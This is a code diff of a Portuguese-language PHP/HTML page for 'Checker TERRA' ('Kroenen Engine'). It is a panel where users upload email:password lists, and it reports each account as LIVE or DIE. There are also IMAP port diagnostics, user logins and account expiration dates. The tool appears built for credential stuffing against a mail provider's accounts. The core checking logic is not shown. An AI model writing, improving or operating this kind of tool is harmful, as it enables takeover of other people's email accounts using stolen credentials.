-    document.getElementById('progress').style.display='none';
-    allResults=[];
-}
-function exportResults(){
-    if(allResults.length===0){alert('Nenhum resultado');return;}
-    let txt='';
-    for(const r of allResults){txt+=r.email+':'+(r.status==='live'?'LIVE':'DIE')+'\n';}
-    const blob=new Blob([txt],{type:'text/plain'});
-    const a=document.createElement('a');
-    a.href=URL.createObjectURL(blob);
-    a.download='resultados.txt';
-    a.click();
-}
-async function testDiag(){
-    try{
-        const res=await fetch('index.php?action=diagnostic');
-        const data=await res.json();
-        let msg='DIAGNOSTICO\n\n';
-        msg+='DNS: '+(data.tests?.dns?.ok?'OK':'FALHOU')+'\n';
-        msg+='TCP 993: '+(data.tests?.tcp_993?.ok?'OK':'BLOQUEADA')+'\n';
-        msg+='TCP 143: '+(data.tests?.tcp_143?.ok?'OK':'BLOQUEADA')+'\n';
-        if(data.tests?.ssl_993){msg+='SSL 993: '+(data.tests?.ssl_993?.ok?'OK':'FALHOU')+'\n';msg+='Greeting: '+(data.tests?.ssl_993?.greeting||'N/A')+'\n';}
-        if(data.tests?.curl_imap){msg+='cURL: '+(data.tests?.curl_imap?.ok?'OK':'FALHOU')+'\n';msg+='cURL err: '+(data.tests?.curl_imap?.err||'N/A')+'\n';}
-        msg+='\ncan_connect: '+(data.can_connect?'SIM':'NAO')+'\n';
-        msg+='port_993_blocked: '+(data.port_993_blocked?'SIM':'NAO')+'\n';
-        alert(msg);
-    }catch(e){alert('Erro: '+e.message);}
-}
-</script>
-</body>
-</html>
+<nav>
+    <a href="#" class="nav-brand">
+        <div class="nav-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+        </div>
+        <span class="nav-title">Kroenen Engine</span>
+    </a>
+    <div class="nav-right">
+        <div class="user-chip">
+            <div class="user-avatar"><?= strtoupper(substr($username,0,1)) ?></div>
+            <div>
+                <div class="user-name"><?= htmlspecialchars($username) ?></div>
+                <div class="user-exp"><?= $expiration_date ?></div>
+            </div>
+        </div>
+        <?php if ($is_admin): ?>
+        <a href="admin.php" class="btn btn-admin">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="6"/><path d="M15.477 12.89L17 22l-5-3-5 3 1.523-9.11"/></svg>
+            Admin
+        </a>
+        <?php endif; ?>
+        <button class="btn btn-danger" onclick="logout()">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+            Sair
+        </button>
+    </div>
+</nav>
+<main>
+    <div class="hero">
+        <h1>Checker <span>TERRA</span></h1>
+        <p>Kroenen Automation Engine · OAuth2 TERRA Validator</p>
+    </div>
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-icon" style="background:rgba(124,58,237,.12)">
+                <svg style="stroke:var(--accent-hi)" viewBox="0 0 24 24"><path d="M4 4h16v3H4zM4 11h16v2H4zM4 17h10v2H4z"/></svg>
+            </div>
+            <div>
+                <div class="stat-label">Total</div>
+                <div class="stat-val" id="statTotal">0</div>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon" style="background:var(--success-bg)">
+                <svg style="stroke:var(--success)" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div>
+                <div class="stat-label">Live</div>
+                <div class="stat-val" id="statLive" style="color:var(--success)">0</div>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon" style="background:var(--danger-bg)">
+                <svg style="stroke:var(--danger)" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            </div>
+            <div>
+                <div class="stat-label">Dead</div>
+                <div class="stat-val" id="statDie" style="color:var(--danger)">0</div>
+            </div>
+        </div>
+    </div>
+    <!-- Control -->
+    <div class="control-panel">
+        <div class="cp-title">⚡ Controle de Inspeção</div>
+        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('listFile').click()">
+            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+            <p><strong>Clique para enviar</strong> ou arraste o arquivo aqui</p>
+            <p style="font-size:.76rem;margin-top:.3rem">Formato: email:senha · .txt</p>
+            <div class="file-name" id="fileName"></div>
+            <input type="file" id="listFile" accept=".txt">
+        </div>
+        <div class="run-row">
+            <button id="startBtn" class="btn-start" onclick="startChecker()">
+                <svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                Iniciar Inspeção
+            </button>
+        </div>
+        <div class="progress-wrap">
+            <div class="progress-bar-bg"><div id="progressBar" class="progress-bar"></div></div>
+            <div class="progress-label">
+                <span id="statusText">Sistema pronto · aguardando arquivo</span>
+                <span id="progressPct">0%</span>
+            </div>
+        </div>
+    </div>
+    
